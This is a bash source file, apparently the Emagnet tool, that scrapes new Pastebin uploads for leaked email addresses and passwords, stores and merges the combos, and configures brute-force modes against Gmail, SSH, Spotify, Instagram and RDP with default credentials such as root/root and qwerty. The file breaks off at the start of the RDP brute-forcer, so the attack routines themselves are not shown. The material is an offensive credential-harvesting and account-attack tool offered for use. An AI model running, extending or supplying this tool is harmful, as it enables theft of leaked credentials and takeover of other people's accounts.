#!/usr/bin/env bash

# - iNFO --------------------------------------
#
#   Author: wuseman <wuseman@nr1.nu>
# FileName: emagnet.sh
#  Created: 2018
# Modified: 2023-07-13 (01:39:43)
#  Version: v3.4.3
#
#      iRC: wuseman (Libera/EFnet/LinkNet)
#   GitHub: https://github.com/wuseman/
#
# ----------------------------------------------

EMAGNET_HOME="$HOME/.config/emagnet"
EMAGNET_CONF="$HOME/.config/emagnet/emagnet.conf"
CURRENT_VERSION=3.4.3

emagnet_author() {
    cat <<"EOF"

 Copyright (C) 2018-2023, wuseman

 Emagnet was founded in 2015 and was released as open source
 on github.com/wuseman/emagnet in January 2018 and is licensed
 under GNU LESSER GENERAL PUBLIC LICENSE GPLv3

   - Author: wuseman <wuseman@nr1.nu>
   - IRC   : wuseman <irc.freenode.com>

 Please report bugs/issues on:

   - https://github.com/wuseman/EMAGNET/issues

EOF
}

emagnet_required_tools() {
    for package in wget curl; do
        if ! command -v "$package" &>/dev/null; then
            echo -e "$(basename "$0"): internal error -- $package is required to be installed, exiting."
            exit 1
        fi
    done
}

emagnet_conf() {
    if ! [[ -f ${EMAGNET_CONF} ]]; then
        if ! [[ -d ${EMAGNET_HOME} ]]; then
            mkdir -p "$HOME/.config/emagnet/tmp"
            if [[ -f "./emagnet.conf" ]]; then
                cp "./emagnet.conf" "$HOME/.config/emagnet/"
            else
                echo -e "$basename$0: internal error -- can't copy emagnet.conf to ${EMAGNET_CONF}"
                echo -e "$basename$0: internal error -- to fix this error, you must either run emagnet from it's main dir or download emagnet.conf via:"
                echo -e "$basename$0: internal error -- curl -sL -o ~/.config/emagnet/emagnet.conf https://raw.githubusercontent.com/wuseman/EMAGNET/master/emagnet.conf"
                echo -e "$basename$0: internal error -- Once done, press arrow key up and hit enter..."
                exit 1
            fi
        fi
    fi
    source ${EMAGNET_CONF} &>/dev/null
}

emagnet_version() {
    VERSION="$(grep -i ^VERSION ${EMAGNET_CONF} | cut -d= -f2 | head -n 1)"
    CURRENT_VERSION="$(grep -i current_version $basename$0 | cut -d= -f2 | head -n 1)"

    if [[ "$VERSION" != "$CURRENT_VERSION" ]]; then
        echo -e "$basename$0: internal error -- You are using an old emagnet.conf and emagnet.conf can't be found..."
        echo -e "$basename$0: internal error -- Write current emagnet.conf to ~/.config/emagnet/emagnet.conf by below command..."
        echo -e "$basename$0: internal error -- curl -sL -o ~/.config/emagnet/emagnet.conf https://raw.githubusercontent.com/wuseman/EMAGNET/emagnet/emagnet.conf"
        echo -e "$basename$0: internal error -- Once done, press arrow key up and hit enter..."
        exit 1
    fi
}

emagnet_mustberoot() {
    if [ "$(id -u)" -ne 0 ]; then
        echo "$(basename "$0"): internal error -- root privileges are required"
        exit 1
    fi
}

emagnet_required_stuff() {
    if ! [[ -d "$HOME/.config/emagnet/" ]]; then
        mkdir -p "$HOME/.config/emagnet/tmp"
    fi
    cp "./emagnet.conf" $HOME/.config/emagnet/ &>/dev/null
}

#### UP NEXT! We can remove alot of old stuff in here, will be up next!
#### Paths that must be filled
emagnet_mustbefilled() {
    if [[ -z "$DEBUG" ]]; then
        sed -i "12d" ${EMAGNET_CONF}
        sed -i '12  i DEBUG=false' ${EMAGNET_CONF}
    fi
    if [[ -z "$PASTEBIN" ]]; then
        sed -i '21d' ${EMAGNET_CONF}
        sed -i '21  i PASTEBIN=https:\/\/pastebin.com\/archive\/' ${EMAGNET_CONF}
    fi
    if [[ -z "$TIME" ]]; then
        sed -i '30d' ${EMAGNET_CONF}
        sed -i "30  i TIME=200" ${EMAGNET_CONF}
    fi
    if [[ -z "$MYIP" ]]; then
        sed -i '40d' ${EMAGNET_CONF}
        sed -i "40  i MYIP=$(curl -s https://nr1.nu/i/)" ${EMAGNET_CONF}
    fi
    if [[ -z "$WIP" ]]; then
        sed -i '50d' ${EMAGNET_CONF}
        sed -i '50  i WIP=https:\/\/nr1.nu\/i\/' ${EMAGNET_CONF}
    fi
    if [[ -z "$WIP2" ]]; then
        sed -i '51d' ${EMAGNET_CONF}
        sed -i '51  i WIP2=https:\/\/ifconfig.co' ${EMAGNET_CONF}
    fi
    if [[ -z "$EMAGNET" ]]; then
        sed -i '70d' ${EMAGNET_CONF}
        sed -i '70  i EMAGNET=$HOME/emagnet' ${EMAGNET_CONF}
    fi
    if [[ -z "$EMAGNETHOME" ]]; then
        sed -i "71d" ${EMAGNET_CONF}
        sed -i '71  i EMAGNETHOME=$EMAGNET\/incoming\/$(date +%Y-%m-%d)' ${EMAGNET_CONF}
    fi
    if [[ -z "$EMAGNETLOGS" ]]; then
        sed -i "72d" ${EMAGNET_CONF}
        sed -i '72  i EMAGNETLOGS=$EMAGNETHOME/logs' ${EMAGNET_CONF}
    fi
    if [[ -z "$EMAGNETPW" ]]; then
        sed -i "73d" ${EMAGNET_CONF}
        sed -i '73  i EMAGNETPW=$EMAGNETHOME\/password-files' ${EMAGNET_CONF}
    fi
    if [[ -z "$EMAGNETALL" ]]; then
        sed -i "74d" ${EMAGNET_CONF}
        sed -i '74  i EMAGNETALL=$EMAGNETHOME\/all-files' ${EMAGNET_CONF}
    fi
    if [[ -z "$EMAGNETCRAP" ]]; then
        sed -i "75d" ${EMAGNET_CONF}
        sed -i '75  i EMAGNETCRAP=$EMAGNETHOME\/.pastebin' ${EMAGNET_CONF}
    fi
    if [[ -z "$EMAGNETTEMP" ]]; then
        sed -i "76d" ${EMAGNET_CONF}
        sed -i '76  i EMAGNETTEMP=$EMAGNETHOME\/.temp' ${EMAGNET_CONF}
    fi
    if [[ -z "$EMAGNETARCHIVE" ]]; then
        sed -i "77d" ${EMAGNET_CONF}
        sed -i '77  i EMAGNETARCHIVE=$EMAGNET/archive' ${EMAGNET_CONF}
    fi
    if [[ -z "$EMAGNETDB" ]]; then
        sed -i "78d" ${EMAGNET_CONF}
        sed -i '78  i EMAGNETDB=$EMAGNETHOME\/email-files' ${EMAGNET_CONF}
    fi
    if [[ -z "$EMAGNETBACKUP" ]]; then
        sed -i "79d" ${EMAGNET_CONF}
        sed -i '79  i EMAGNETBACKUP=$EMAGNET/backup' ${EMAGNET_CONF}
    fi
    if [[ -z "$EMAGNETSYNTAX" ]]; then
        sed -i "80d" ${EMAGNET_CONF}
        sed -i '80  i EMAGNETSYNTAX=$EMAGNETHOME\/sorted-by-syntax' ${EMAGNET_CONF}
    fi
    if [[ -z "$EMAGNETCRACKED" ]]; then
        sed -i "81d" ${EMAGNET_CONF}
        sed -i '81  i EMAGNETCRACKED=$EMAGNET/cracked-accounts' ${EMAGNET_CONF}
    fi
    if [[ -z "$VERSION" ]]; then
        sed -i '90d' ${EMAGNET_CONF}
        sed -i '90  i VERSION=3.4.3' ${EMAGNET_CONF}
    fi
    if [[ -z "$THREADS" ]]; then
        sed -i '99d' ${EMAGNET_CONF}
        sed -i "99  i THREADS=$(xargs --show-limits -s 1 2>&1 | grep -i "parallelism" | awk '{print $8}')" ${EMAGNET_CONF}
    fi
    if [[ -z "$IDLETIME" ]]; then
        sed -i '108d' ${EMAGNET_CONF}
        sed -i "108 i IDLETIME=3600" ${EMAGNET_CONF}
    fi
    if [[ -z "$GBRUTEFORCE" ]]; then
        sed -i '124d' ${EMAGNET_CONF}
        sed -i '124 i GBRUTEFORCE=false' ${EMAGNET_CONF}
    fi
    if [[ -z "$SBRUTEFORCE" ]]; then
        sed -i '125d' ${EMAGNET_CONF}
        sed -i '125 i SBRUTEFORCE=false' ${EMAGNET_CONF}
    fi
    if [[ -z "$PBRUTEFORCE" ]]; then
        sed -i '126d' ${EMAGNET_CONF}
        sed -i '126 i PBRUTEFORCE=false' ${EMAGNET_CONF}
    fi
    if [[ -z "$IBRUTEFORCE" ]]; then
        sed -i '127d' ${EMAGNET_CONF}
        sed -i '127 i IBRUTEFORCE=false' ${EMAGNET_CONF}
    fi
    if [[ -z "$BBRUTEFORCE" ]]; then
        sed -i '128d' ${EMAGNET_CONF}
        sed -i '128 i BBRUTEFORCE=' ${EMAGNET_CONF}
    fi
    if [[ -z "$CBRUTEFORCE" ]]; then
        sed -i '129d' ${EMAGNET_CONF}
        sed -i '129 i CBRUTEFORCE=' ${EMAGNET_CONF}
    fi
    if [[ -z "$DBRUTEFORCE" ]]; then
        sed -i '130d' ${EMAGNET_CONF}
        sed -i '130 i DBRUTEFORCE=' ${EMAGNET_CONF}
    fi
    if [[ -z "$EBRUTEFORCE" ]]; then
        sed -i '131d' ${EMAGNET_CONF}
        sed -i '131 i EBRUTEFORCE=' ${EMAGNET_CONF}
    fi
    #if [[ -z "$EMAIL2SEND"     ]];then sed -i '140d' ${EMAGNET_CONF};sed -i '140 i EMAIL2SEND='                                                                                                             ${EMAGNET_CONF};fi
    if [[ -z "$NOTIFY" ]]; then
        sed -i '149d' ${EMAGNET_CONF}
        sed -i '149 i NOTIFY=false' ${EMAGNET_CONF}
    fi
    if [[ -z "$VPN" ]]; then
        sed -i '161d' ${EMAGNET_CONF}
        sed -i '161 i VPN=false' ${EMAGNET_CONF}
    fi
    if [[ -z "$VPNROOT" ]]; then
        sed -i '162d' ${EMAGNET_CONF}
        sed -i '162 i VPNROOT=/etc/openvpn' ${EMAGNET_CONF}
    fi
    if [[ -z "$VPNPROVIDER" ]]; then
        sed -i '163d' ${EMAGNET_CONF}
        sed -i '163 i VPNPROVIDER=$VPNROOT/' ${EMAGNET_CONF}
    fi
    if [[ -z "$VPNCOUNTRYS" ]]; then
        sed -i '164d' ${EMAGNET_CONF}
        sed -i '164 i VPNCOUNTRYS="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"' ${EMAGNET_CONF}
    fi
    if [[ -z "$SSHUSER" ]]; then
        sed -i '176d' ${EMAGNET_CONF}
        sed -i '176 i SSHUSER="root"' ${EMAGNET_CONF}
    fi
    if [[ -z "$SSHPORT" ]]; then
        sed -i '177d' ${EMAGNET_CONF}
        sed -i '177 i SSHPORT="22"' ${EMAGNET_CONF}
    fi
    if [[ -z "$SSHPASS" ]]; then
        sed -i '178d' ${EMAGNET_CONF}
        sed -i '178 i SSHPASS=root' ${EMAGNET_CONF}
    fi
    if [[ -z "$SSHTARGETS" ]]; then
        sed -i '179d' ${EMAGNET_CONF}
        sed -i '179 i SSHTARGETS="$HOME/.config/emagnet/tmp/.emagnet-sshbruter.txt"' ${EMAGNET_CONF}
    fi
    if [[ -z "$SSHPORTSCAN" ]]; then
        sed -i '180d' ${EMAGNET_CONF}
        sed -i '180 i SSHPORTSCAN="$HOME/.config/emagnet/tmp/.emagnet-portscan.txt"' ${EMAGNET_CONF}
    fi
    if [[ -z "$RDPUSER" ]]; then
        sed -i '192d' ${EMAGNET_CONF}
        sed -i '192 i RDPUSER="Administrator"' ${EMAGNET_CONF}
    fi
    if [[ -z "$RDPPORT" ]]; then
        sed -i '193d' ${EMAGNET_CONF}
        sed -i '193 i RDPPORT="3389"' ${EMAGNET_CONF}
    fi
    if [[ -z "$RDPPASS" ]]; then
        sed -i '194d' ${EMAGNET_CONF}
        sed -i '194 i RDPPASS="qwerty"' ${EMAGNET_CONF}
    fi
    if [[ -z "$RDPTARGETS" ]]; then
        sed -i '195d' ${EMAGNET_CONF}
        sed -i '195 i RDPTARGETS="$HOME/.config/emagnet/tmp/.emagnet-rdpbruter.txt"' ${EMAGNET_CONF}
    fi
    if [[ -z "$RDPPORTSCAN" ]]; then
        sed -i '196d' ${EMAGNET_CONF}
        sed -i '196 i RDPPORTSCAN="$HOME/.config/emagnet/tmp/.emagnet-portscan.txt"' ${EMAGNET_CONF}
    fi
    if [[ -z "$USERAGENT" ]]; then
        sed -i '206d' ${EMAGNET_CONF}
        sed -i '206 i USERAGENT=Mosaic/0.9' ${EMAGNET_CONF}
    fi
    if [[ -z "$PROXY" ]]; then
        sed -i '219d' ${EMAGNET_CONF}
        sed -i '219 i PROXY=false' ${EMAGNET_CONF}
    fi
    if [[ -z "$PROXYHOST" ]]; then
        sed -i '220d' ${EMAGNET_CONF}
        sed -i '220 i PROXY=localhost' ${EMAGNET_CONF}
    fi
    if [[ -z "$PROXYPORT" ]]; then
        sed -i '221d' ${EMAGNET_CONF}
        sed -i '221 i PROXY=5000' ${EMAGNET_CONF}
    fi
    if [[ -z "$PROXYUSER" ]]; then
        sed -i '222d' ${EMAGNET_CONF}
        sed -i '222 i PROXY=user' ${EMAGNET_CONF}
    fi
    if [[ -z "$PROXYPORT" ]]; then
        sed -i '223d' ${EMAGNET_CONF}
        sed -i '223 i PROXY=password' ${EMAGNET_CONF}
    fi
}

emagnet_move_realtime() {
    mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &>/dev/null
    rm "$HOME/.config/emagnet/tmp/.emagnet-*" &>/dev/null
}

emagnet_check_pastebin() {
    source $HOME/.config/emagnet/emagnet.conf
    curl -s -H "$USERAGENT" https://pastebin.com >$EMAGNETTEMP/.status
    grep -qi "captcha" $EMAGNETTEMP/.status
    if [[ "$?" = "0" ]]; then
        MYIP_PASTEBIN=$(curl -s --insecure https://nr1.nu/i/)
        echo -e "$basename$0: internal error -- pastebin blocked\e[1;31m $(curl -s ifconfig.co)\e[0m, try again within 60 minutes..."
        exit 1
    fi
    grep -qi "is under heavy load right now" /$EMAGNETTEMP/.status
    if [[ "$?" = "0" ]]; then
        echo -e "$basename$0: internal error -- pastebin is under heavy load, please try again in a few seconds.."
        exit 1
    fi
    grep -qi "TO GET ACCESS" /$EMAGNETTEMP/.status
    if [[ "$?" = "0" ]]; then
        echo -e "$basename$0: internal error -- ${MYIP} does not have access to https://scrape.pastebin.com/api_scraping.php...."
        exit 1
    fi
    grep -qi "hy do I have t" /$EMAGNETTEMP/.status
    if [[ "$?" = "0" ]]; then
        echo -e "$basename$0: internal error -- cloudfare has blocked $(curl -s https://ifconfig.co), please read here: https://github.com/wuseman/Emagnet/issues/46#issuecomment-846446070"
        exit 1
    fi

    rm $EMAGNETTEMP/.status &>/dev/null
}

emagnet_banner() {
    cat <<"EOF"
     _                      _______                      _
  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
 dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
 V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
      __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
 _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._
             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
     `'                  `OObNNNNNdOO'                   `'
                           `~OOOOO~'
EOF

    printf "\n%64s \n\n" | tr ' ' '='
}

emagnet_usage() {
    cat <<EOF

Usage: ./$basename$0 [--author] [--emagnet] [--option] .....

  -a, --author        Show author information
  -b, --backup        Create a compressed archive
                      - Available options: all/archive/incoming
  -d, --stats         Count total passwords, mail addresses and how many files you downloaded 
  -h, --help          Display this very helpful text
  -t, --time          Set refresh time in seconds
  -V, --version       Displays version information.
  -i, --ip            Print you current WAN IPv4/IPv6
  -e, --emagnet       Download latest uploaded files on pastebin
                      and store email addresses and passwords in sorted day directories.
  -g, --bruteforce    Same as above '-e' with brute-force mode on
                      - Available options: gmail/ssh/spotify/instagram/rdp
  -k, --kill          Kill emagnet ghost sessions
  -m, --move          Move and Merge all files to archive
  -q, --quiet         Run emagnet in a screen

EOF
}

emagnet_clear() {
    clear
}

emagnet_iconnection() {
    if ! ping -i 1 -c 1 google.com &>/dev/null && ! ping -i 1 -c 1 1.1.1.1 &>/dev/null; then
        echo "$(basename "$0"): Internal error - This feature requires an internet connection, but you appear to be offline. Exiting..."
        exit 1
    fi
}

emagnet_optional() {
    sleep 0
}

emagnet_paths() {
    if [[ ! -d "${EMAGNETALL}" ]]; then
        PATHS=(
            "${EMAGNETHOME}"
            "${EMAGNETCRACKED}"
            "${EMAGNETDB}"
            "${EMAGNETPW}"
            "${EMAGNETTEMP}"
            "${EMAGNETCRAP}"
            "${EMAGNETALL}"
            "${EMAGNETARCHIVE}"
            "${EMAGNETLOGS}"
        )

        for DIR in "${PATHS[@]}"; do
            if [[ ! -d "${DIR}" ]]; then
                mkdir -p "${DIR}" &>/dev/null
            fi
        done
    fi
}

emagnet_screen() {
    mkdir -p /tmp/screen/S-root &>/dev/null
    chmod 755 /tmp/screen &>/dev/null
    chmod -R 700 /tmp/screen/S-root &>/dev/null

    if ! hash screen &>/dev/null; then
        echo "$(basename "$0"): Internal error -- Screen is required to be installed before you can run emagnet in screen..."
        exit 1
    fi

    pid=$(pgrep emagnet)
    printf "%s: emagnet has been started in the background (pid: %s)\n" "$(basename "$0")" "$(pgrep -f 'SCREEN -dmS emagnet')"
    screen -S "emagnet" -dm bash "$0" --emagnet
}

emagnet_kill() {
    ESESSIONS=$(pgrep -f 'emagnet' | sed '$d')
    NRESESSIONS=$(pgrep -f 'emagnet' | sed '$d' | wc -l)
    NRINSCREEN=$(screen -ls | grep 'emagnet' | awk -F"." '{print $1}' | sed 's/\t//g' | wc -l)
    INSCREEN=$(screen -ls | grep 'emagnet' | awk -F"." '{print $1}' | sed 's/\t//g')

    if [[ "$INSCREEN" -gt "0" ]]; then
        for screens in "$INSCREEN"; do
            screen -X -S "$screens" kill
            if [[ $? == 0 ]]; then
                echo -e "[\e[1;31m<<\e[0m] - $NRINSCREEN emagnet screens have been killed\n"
            fi
        done
    fi

    if [[ "$NRESESSIONS" -lt "3" ]]; then
        echo -e "$(basename "$0"): Internal error -- 0 emagnet sessions are currently running"
    else
        echo -e "$(basename "$0"): Killed $(echo "$NRESESSIONS"-2 | bc) emagnet sessions"
        kill -9 "$ESESSIONS" &>/dev/null
    fi
}

emagnet_analyzing_message() {
    if [[ "$GBRUTEFORCE" = "true" ]]; then
        printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
        printf "%64s \n\n" | tr ' ' '='
    elif [[ "$PBRUTEFORCE" = "true" ]]; then
        printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
        printf "%64s \n\n" | tr ' ' '='
    elif [[ "$SBRUTEFORCE" = "true" ]]; then
        printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
        printf "%64s \n\n" | tr ' ' '='
    elif [[ "$IBRUTEFORCE" = "true" ]]; then
        printf "%17s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
        printf "%64s \n\n" | tr ' ' '='
    elif [[ "$RBRUTEFORCE" = "true" ]]; then
        printf "%20s \e[1;31mRDP\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
        printf "%64s \n\n" | tr ' ' '='
    else
        sleep 0
    fi

    text="Analyzing..."
    delay="0.1"
    printf "%26s" # Add the format specifier and argument here
    for analyzing in $(seq 0 $(expr length "${text}")); do
        echo -n "${text:$analyzing:1}"
        sleep "${delay}"
    done
}

emagnet_analyzer() {
    emagnet_clear
    emagnet_banner
    if [[ "$GBRUTEFORCE" = "true" ]]; then
        printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
        printf "%64s \n\n" | tr ' ' '='
    elif [[ "$PBRUTEFORCE" = "true" ]]; then
        printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
        printf "%64s \n\n" | tr ' ' '='
    elif [[ "$SBRUTEFORCE" = "true" ]]; then
        printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
        printf "%64s \n\n" | tr ' ' '='
    elif [[ "$IBRUTEFORCE" = "true" ]]; then
        printf "%17s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
        printf "%64s \n\n" | tr ' ' '='
    elif [[ "$RBRUTEFORCE" = "true" ]]; then
        printf "%20s \e[1;31mRDP\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
        printf "%64s \n\n" | tr ' ' '='
    else
        sleep 0
    fi

    wait_time=$TIME
    temp_cnt=$wait_time
    while [[ $temp_cnt -gt 0 ]]; do
        printf "\r              I'll Find You <-%2d -> It's A Matter Of Time" "$temp_cnt"
        sleep 1
        ((temp_cnt--))
    done
}

emagnet_move_files() {
    find $EMAGNET/incoming -maxdepth 1 -type d | sed '1d' | grep '.' &>/dev/null
    [[ "$?" -gt "0" ]] && echo -e "$basename$0: internal error -- you have no daily directories in $EMAGNET/incoming, nothing to move..." ||
        [[ -d "$EMAGNETARCHIVE/all-files" ]] && mkdir -p "$EMAGNETARCHIVE"/{all-files,email-files,password-files,logs}

    if [[ -d /root/emagnet/incoming/*/all-files/ ]]; then
        echo -e "Moved:    [\e[1;31m00\e[0m] files to: $EMAGNETARCHIVE/all-files..."
    else
        ALL_FILES="$(ls $EMAGNET/incoming/*/all-files | wc -l)"
        echo -e "Moved:    [\e[1;31m$ALL_FILES\e[0m] files to: $EMAGNETARCHIVE/all-files..."
        find /root/emagnet/incoming/*/all-files -type f -exec cp {} $EMAGNETARCHIVE/all-files \;
    fi

    if [[ -d "/root/emagnet/incoming/$(date +%Y)*/email-files/" ]]; then
        echo -e "Moved:    [\e[1;31m00\e[0m] email-files to: $EMAGNETARCHIVE/email-files..."
    else
        EMAIL_FILES="$(ls $EMAGNET/incoming/*/email-files | wc -l)"
        echo -e "Moved:    [\e[1;31m$EMAIL_FILES\e[0m] email-files to: $EMAGNETARCHIVE/email-files..."
        find $HOME/emagnet/incoming/*/email-files -type f -exec cp {} $EMAGNETARCHIVE/email-files/ \;

    fi

    if [[ -d "/root/emagnet/incoming/$(date +%Y)*/password-files" ]]; then
        echo -e "Moved:    [\e[1;31m00\e[0m] password-files to: $EMAGNETARCHIVE/email-files..."
    else
        PASSWORD_FILES="$(ls $EMAGNET/incoming/*/password-files | wc -l)"
        echo -e "Moved:    [\e[1;31m$PASSWORD_FILES\e[0m] password-files to: $EMAGNETARCHIVE/password-files..."
        find $HOME/emagnet/incoming/*/password-files -type f -exec cp {} $EMAGNETARCHIVE/password-files/ \;
    fi

    if ! [[ -f "/root/emagnet/incoming/$(date +%Y)*/logs/emails-from-pastebin.txt" ]]; then
        echo -e "Merged:   [\e[1;31m00\e[0m] email addresses..."
    else
        EMAIL_ADDRESSES="$(cat $EMAGNET/incoming/*/logs/email-files | wc -l)"
        echo -e "Merged:   [\e[1;31m$EMAIL_ADDRESSES\e[0m] email addresses to: $EMAGNETARCHIVE/logs/email-files..."
        cat /root/emagnet/incoming/$(date +%Y)*/logs/emails-from-pastebin.txt >>$EMAGNETARCHIVE/logs/emails-from-pastebin.txt
    fi

    if ! [[ -f "/root/emagnet/incoming/$(date +%Y)*/logs/passwords-from-pastebin.txt" ]]; then
        echo -e "Merged:   [\e[1;31m00\e[0m] email and passwords combos to ..."
    else
        PASSWORDS="$(cat $EMAGNET/incoming/*/logs/passwords-from-pastebin.txt | wc -l)"
        echo -e "Merged:   [\e[1;31m$PASSWORDS\e[0m] email and passwords combos to: $EMAGNETARCHIVE/logs/passwords-from-pastebin.txt"
        cat /root/emagnet/incoming/$(date +%Y)*/logs/passwords-from-pastebin.txt >>$EMAGNETARCHIVE/logs/passwords-from-pastebin.txt
    fi

    echo -e "\nAll done"

    read -p "Wipe incoming directories (Y/n): " cleanup
    if [[ "$cleanup" = "y" ]]; then
        rm -rf "$EMAGNET/incoming/"
        printf "\e[1;31mWiped\e[0m all daily directories in: $EMAGNET/incoming...\nAll Done...\n"
    else
        printf "Aborted..\n"

    fi
}
emagnet_count_down() {
    emagnet_paths
    emagnet_conf

    if [[ "$GBRUTEFORCE" = "true" ]]; then
        sed -i '125d' ${EMAGNET_CONF}
        sed -i '125 i GBRUTEFORCE=true' ${EMAGNET_CONF}
        sed -i '126d' ${EMAGNET_CONF}
        sed -i '126 i SBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '127d' ${EMAGNET_CONF}
        sed -i '127 i PBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '128d' ${EMAGNET_CONF}
        sed -i '128 i IBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '129d' ${EMAGNET_CONF}
        sed -i '129 i RBRUTEFORCE=false' ${EMAGNET_CONF}
        emagnet_conf
        printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
        printf "\n%64s \n\n" | tr ' ' '='
        emagnet_analyzer

    elif [[ "$SBRUTEFORCE" = "true" ]]; then
        sed -i '125d' ${EMAGNET_CONF}
        sed -i '125 i GBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '126d' ${EMAGNET_CONF}
        sed -i '126 i SBRUTEFORCE=true' ${EMAGNET_CONF}
        sed -i '127d' ${EMAGNET_CONF}
        sed -i '127 i PBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '128d' ${EMAGNET_CONF}
        sed -i '128 i IBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '129d' ${EMAGNET_CONF}
        sed -i '129 i RBRUTEFORCE=false' ${EMAGNET_CONF}
        emagnet_conf
        printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
        printf "\n%64s \n\n" | tr ' ' '='
        emagnet_analyzer

    elif [[ "$PBRUTEFORCE" = "true" ]]; then
        sed -i '125d' ${EMAGNET_CONF}
        sed -i '125 i GBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '126d' ${EMAGNET_CONF}
        sed -i '126 i SBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '127d' ${EMAGNET_CONF}
        sed -i '127 i PBRUTEFORCE=true' ${EMAGNET_CONF}
        sed -i '128d' ${EMAGNET_CONF}
        sed -i '128 i IBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '129d' ${EMAGNET_CONF}
        sed -i '129 i RBRUTEFORCE=false' ${EMAGNET_CONF}
        emagnet_conf
        printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
        printf "\n%64s \n\n" | tr ' ' '='
        emagnet_analyzer

    elif [[ "$IBRUTEFORCE" = "true" ]]; then
        sed -i '125d' ${EMAGNET_CONF}
        sed -i '125 i GBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '126d' ${EMAGNET_CONF}
        sed -i '126 i SBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '127d' ${EMAGNET_CONF}
        sed -i '127 i PBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '128d' ${EMAGNET_CONF}
        sed -i '128 i IBRUTEFORCE=true' ${EMAGNET_CONF}
        sed -i '129d' ${EMAGNET_CONF}
        sed -i '129 i RBRUTEFORCE=false' ${EMAGNET_CONF}
        emagnet_conf
        printf "%20s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
        printf "\n%64s \n\n" | tr ' ' '='
        emagnet_analyzer

    elif [[ "$RBRUTEFORCE" = "true" ]]; then
        sed -i '125d' ${EMAGNET_CONF}
        sed -i '125 i GBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '126d' ${EMAGNET_CONF}
        sed -i '126 i SBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '127d' ${EMAGNET_CONF}
        sed -i '127 i PBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '128d' ${EMAGNET_CONF}
        sed -i '128 i IBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '129d' ${EMAGNET_CONF}
        sed -i '129 i RBRUTEFORCE=true' ${EMAGNET_CONF}
        emagnet_conf
        printf "%20s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
        printf "\n%64s \n\n" | tr ' ' '='
        emagnet_analyzer
    else
        emagnet_conf
        sed -i '125d' ${EMAGNET_CONF}
        sed -i '125 i GBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '126d' ${EMAGNET_CONF}
        sed -i '126 i SBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '127d' ${EMAGNET_CONF}
        sed -i '127 i PBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '128d' ${EMAGNET_CONF}
        sed -i '128 i IBRUTEFORCE=false' ${EMAGNET_CONF}
        sed -i '129d' ${EMAGNET_CONF}
        sed -i '129 i RBRUTEFORCE=false' ${EMAGNET_CONF}
        emagnet_analyzer
    fi
}

emagnet_rdpbruter() {
    hash xfreerdp &>/dev/null
    (
        [[ $? -eq "0" ]] || echo -e "$basename$0: internal error -- xfreerdp is required to be installed"
        exit 1
    )
    emagnet_conf
    if [[ -z "$rdpPASS" ]]; then
